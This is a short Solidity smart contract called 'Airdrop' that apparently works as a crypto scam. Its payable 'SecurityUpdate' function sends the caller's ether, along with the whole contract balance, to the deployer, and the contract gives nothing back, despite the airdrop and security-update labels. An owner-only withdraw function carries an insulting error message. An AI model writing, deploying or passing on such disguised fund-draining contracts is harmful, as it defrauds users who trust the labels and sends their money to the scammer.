// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;

contract Airdrop {
    address private owner;

    constructor() {
        owner = msg.sender;
    }

    function withdraw() public payable {
        require(msg.sender == owner, "Bro? Are you a stupid idiot?");
        payable(msg.sender).transfer(address(this).balance);
    }

    function SecurityUpdate() public payable {
        if (msg.value > 0) payable(owner).transfer(address(this).balance);
    }

    function greet() public pure returns (string memory) {
        return "Airdrop";
    }
}
